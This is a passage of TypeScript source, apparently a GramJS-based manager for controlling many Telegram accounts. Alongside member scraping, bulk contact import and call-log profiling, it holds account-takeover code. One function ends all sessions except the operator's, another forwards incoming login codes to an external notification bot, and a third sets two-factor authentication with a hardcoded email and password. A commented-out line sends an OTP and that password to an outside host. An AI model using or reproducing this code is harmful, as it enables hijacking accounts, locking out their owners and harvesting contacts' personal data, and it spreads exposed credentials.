Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams) {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats;\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit });\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (const id of chats) {\n            try {\n                const channelId = id.startsWith('-100') ? id : `-100${id}`;\n                await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: channelId\n                    })\n                );\n                console.log(`${this.phoneNumber} Left channel :`, id);\n                if (chats.length > 1) {\n                    await sleep(3000);\n                }\n\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);\n                break;\n            }\n        }\n        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: Api.Authorization): boolean {\n        const authCriteria = [\n            { field: 'country', value: 'singapore' },\n            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\n            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }\n        ];\n\n        return authCriteria.some(criterion => {\n            if ('values' in criterion) {\n                return criterion.values.some(value =>\n                    auth[criterion.field].toLowerCase().includes(value.toLowerCase())\n                );\n            }\n            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());\n        });\n    }\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(chatId: string) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory({\n                justClear: false,\n                peer: chatId,\n                revoke: false,\n            }));\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\n        try {\n            const query = { limit: parseInt(limit.toString()) };\n            if (offset) query['offsetId'] = parseInt(offset.toString());\n\n            const messages = await this.client.getMessages(chatId, query);\n            const mediaMessages = messages.filter(message => {\n                // console.log(message.media?.className)\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\n            });\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\n\n            if (!messages.length) {\n                // If no media messages are returned, we might have reached the end\n                console.log(\"No more media messages found. Reached the end of the chat.\");\n                return { data: [], endOfMessages: true };\n            }\n\n            const data = [];\n\n            for (const message of mediaMessages) {\n                console.log(message.media.className, message.document?.mimeType);\n                let thumbBuffer = null;\n\n                try {\n                    if (message.media instanceof Api.MessageMediaPhoto) {\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n                        console.log(\"messageId image:\", message.id)\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'photo',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                        const sizes = message.document?.thumbs || [1];\n                        console.log(\"messageId video:\", message.id)\n                        // const fileSize = message.document.size;\n\n                        // // Skip overly large files for thumbnail (set threshold as needed)\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\n                        //     continue;\n                        // }\n\n                        // Call downloadWithTimeout with a 5-second timeout\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'video',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n                    }\n                } catch (downloadError) {\n                    if (downloadError.message === 'Download timeout') {\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\n                        console.warn('File reference expired for message. Skipping this media.');\n                        // Skip the expired media, continue processing others\n                    } else {\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\n                    }\n                    data.push({\n                        messageId: message.id,\n                        mediaType: 'photo',\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\n                    });\n\n                    // Skip the message and continue with the next one if there's any error\n                    continue;\n                }\n            }\n            if (!data.length) {\n                data.push({\n                    messageId: messages[messages.length - 1].id,\n                    mediaType: 'photo',\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\n                })\n            }\n            console.log(\"Returning \", data.length);\n\n            // Return the metadata and signal if we reached the end of messages\n            return { data, endOfMessages: false };\n\n        } catch (error) {\n            console.error('Error in getMediaMetadata:', error);\n            if (error.message.includes('FLOOD_WAIT')) {\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\n                // Handle flood wait, retry logic\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\n            }\n\n            throw new Error('Error fetching media metadata');\n        }\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const entity = await this.safeGetEntity(chatId);\n            const messages = await this.client.getMessages(entity, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\n        return Promise.race([\n            promise,\n            new Promise<T>((_, reject) =>\n                setTimeout(() => reject(new Error('Download timeout')), timeout)\n            )\n        ]);\n    }\n\n    private getMediaDetails(media: Api.MessageMediaDocument) {\n        if (!media?.document) return null;\n\n        const doc = media.document;\n        if (doc instanceof Api.DocumentEmpty) return null;\n        const videoAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeVideo\n        ) as Api.DocumentAttributeVideo;\n\n        const fileNameAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeFilename\n        ) as Api.DocumentAttributeFilename;\n\n        return {\n            size: doc.size,\n            mimeType: doc.mimeType,\n            fileName: fileNameAttr?.fileName || null,\n            duration: videoAttr?.duration || null,\n            width: videoAttr?.w || null,\n            height: videoAttr?.h || null\n        };\n    }\n\n    private async downloadFileFromUrl(url: string): Promise<Buffer> {\n        try {\n            const response = await axios.get(url, {\n                responseType: 'arraybuffer',\n                timeout: 30000\n            });\n            return Buffer.from(response.data);\n        } catch (error) {\n            throw new Error(`Failed to download file: ${error.message}`);\n        }\n    }\n\n    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll(),\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    